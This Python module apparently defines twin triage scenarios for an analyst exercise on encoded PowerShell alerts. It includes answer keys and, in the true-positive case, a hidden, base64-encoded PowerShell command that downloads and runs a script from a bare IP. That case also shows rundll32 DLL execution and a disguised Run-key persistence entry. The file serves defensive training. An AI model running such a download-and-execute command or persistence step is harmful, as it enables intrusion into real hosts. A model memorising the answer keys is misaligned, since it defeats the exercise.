"""Host execution alerts.

The base64 in both scenarios is real: decode it with
`base64 -d | iconv -f UTF-16LE` and you get the command shown in the EDR event.
An analyst who never decodes it cannot tell these two apart, which is the point.
"""
from __future__ import annotations

from datetime import timedelta as T

from ..model import Alert, Event, GroundTruth, Scenario

_ALERT = dict(
    rule="EDR-0117 Encoded PowerShell command line",
    severity="high",
    technique="T1059.001",
    technique_name="Command and Scripting Interpreter: PowerShell",
)

_TP_B64 = ("SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC"
           "4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADQANQAuADYAMQAu"
           "ADEAMwA2AC4AMQA5AC8AdQAvAGEALgBwAHMAMQAnACkA")
_FP_B64 = ("RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AUQB1AGkA"
           "YwBrAEYAaQB4AEUAbgBnAGkAbgBlAGUAcgBpAG4AZwAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUA"
           "YwB0ACAASABvAHQARgBpAHgASQBEACwASQBuAHMAdABhAGwAbABlAGQATwBuAA==")

ENCODED_PS_TP = Scenario(
    id="execution-encodedps-tp",
    title="Encoded PowerShell on a finance workstation",
    twin="execution-encodedps-fp",
    tags=("host", "sysmon", "powershell"),
    alert=Alert(
        summary="powershell.exe launched with -EncodedCommand on FIN-WS-214 "
                "(user: a.reyes).",
        **_ALERT),
    events=[
        Event(T(minutes=-3), "edr", "email.attachment.opened", {
            "host": "FIN-WS-214", "user": "a.reyes",
            "file": "Remittance_Advice_Sept.docm", "sender": "accounts@supplier-invoices.co"}),
        Event(T(0), "sysmon", "process.create", {
            "event_id": 1, "host": "FIN-WS-214", "user": "a.reyes",
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "command_line": "powershell.exe -nop -w hidden -enc " + _TP_B64}),
        Event(T(seconds=2), "edr", "script.decoded", {
            "host": "FIN-WS-214",
            "decoded": "IEX(New-Object Net.WebClient).DownloadString("
                       "'http://45.61.136.19/u/a.ps1')"}),
        Event(T(seconds=4), "zeek", "conn", {
            "uid": "CtR9aa", "id.orig_h": "10.14.22.214", "id.orig_p": 49812,
            "id.resp_h": "45.61.136.19", "id.resp_p": 80, "service": "http",
            "note": "no TLS, bare IP, no prior connections from this subnet"}),
        Event(T(seconds=9), "sysmon", "process.create", {
            "event_id": 1, "host": "FIN-WS-214", "user": "a.reyes",
            "image": "C:\\Windows\\System32\\rundll32.exe",
            "parent_image": "...\\powershell.exe",
            "command_line": "rundll32.exe C:\\Users\\a.reyes\\AppData\\Local\\Temp\\ui.dat,Start"}),
        Event(T(minutes=1), "sysmon", "registry.set", {
            "event_id": 13, "host": "FIN-WS-214",
            "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync",
            "value": "rundll32.exe C:\\Users\\a.reyes\\AppData\\Local\\Temp\\ui.dat,Start"}),
        Event(T(minutes=-40), "sysmon", "process.create", {
            "event_id": 1, "host": "FIN-WS-214", "user": "a.reyes",
            "image": "...\\powershell.exe", "parent_image": "...\\explorer.exe",
            "command_line": "powershell.exe -ExecutionPolicy Bypass -File "
                            "C:\\Scripts\\Month-End-Export.ps1",
            "note": "this user runs PowerShell most days"}),
    ],
    truth=GroundTruth(
        verdict="true-positive",
        rationale=(
            "The parent is WINWORD.EXE three minutes after a macro-enabled attachment was "
            "opened, and the decoded command fetches a script over plain HTTP from a bare "
            "IP. It then writes a DLL to Temp, runs it through rundll32, and adds a Run key "
            "disguised as OneDriveSync. Delivery, execution and persistence in ninety "
            "seconds."),
        decisive=[1, 2, 4, 5],
        distractors=[6],
        common_error=(
            "Deciding that PowerShell is normal on this host. It is — the analyst just has "
            "to read the parent process. Office spawning a hidden, encoded PowerShell is "
            "not the same event as a user running a signed script from Explorer."),
        next_action=(
            "Isolate the host, collect ui.dat, block 45.61.136.19, and search the mail "
            "gateway for other recipients of the same sender."),
    ),
)

ENCODED_PS_FP = Scenario(
    id="execution-encodedps-fp",
    title="Encoded PowerShell across the desktop fleet",
    twin="execution-encodedps-tp",
    tags=("host", "sysmon", "powershell", "sccm"),
    alert=Alert(
        summary="powershell.exe launched with -EncodedCommand on ENG-WS-077 "
                "(user: SYSTEM).",
        **_ALERT),
    events=[
        Event(T(0), "sysmon", "process.create", {
            "event_id": 1, "host": "ENG-WS-077", "user": "NT AUTHORITY\\SYSTEM",
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_image": "C:\\Windows\\CCM\\CcmExec.exe",
            "command_line": "powershell.exe -NonInteractive -ExecutionPolicy Bypass -enc "
                            + _FP_B64}),
        Event(T(seconds=1), "edr", "script.decoded", {
            "host": "ENG-WS-077",
            "decoded": "Get-WmiObject -Class Win32_QuickFixEngineering | "
                       "Select-Object HotFixID,InstalledOn"}),
        Event(T(seconds=3), "edr", "detection.fleet_count", {
            "host": "-", "user": "-",
            "note": "identical command line observed on 412 hosts between 02:00 and 02:04",
            "window": "4 minutes"}),
        Event(T(minutes=-2), "edr", "sccm.deployment", {
            "host": "ENG-WS-077", "user": "-",
            "deployment_id": "DEP-2026-0914-PATCHAUDIT",
            "note": "scheduled configuration baseline 'Patch Audit' targeted at All Workstations"}),
        Event(T(seconds=5), "sysmon", "process.terminate", {
            "event_id": 5, "host": "ENG-WS-077",
            "image": "...\\powershell.exe", "exit_code": 0,
            "note": "no child processes, ran 4.1s"}),
        Event(T(minutes=5), "zeek", "conn", {
            "uid": "Cmm31x", "id.orig_h": "10.9.7.77", "id.orig_p": 50441,
            "id.resp_h": "10.9.0.30", "id.resp_p": 443, "service": "ssl",
            "note": "sccm-mp01.corp.example — routine management point check-in"}),
    ],
    truth=GroundTruth(
        verdict="false-positive",
        rationale=(
            "The parent is CcmExec.exe, the SCCM agent, running as SYSTEM, and the decoded "
            "command only enumerates installed hotfixes. The same command line ran on 412 "
            "hosts inside four minutes, which is a deployment, not an intrusion — an "
            "attacker with that reach would not be listing patches. The process exited "
            "cleanly with no children and no external egress."),
        decisive=[0, 1, 2, 3],
        distractors=[],
        common_error=(
            "Treating '-ExecutionPolicy Bypass' plus '-enc' as the finding. Both are normal "
            "for software distribution: management tooling encodes commands so quoting "
            "survives the agent, and bypasses a policy meant for interactive users. The "
            "flags describe how the command was passed, not what it does."),
        next_action=(
            "Close, and suppress this rule where the parent is CcmExec.exe and the process "
            "runs as SYSTEM — but alert if such a process ever spawns a child."),
    ),
)

SCENARIOS = [ENCODED_PS_TP, ENCODED_PS_FP]
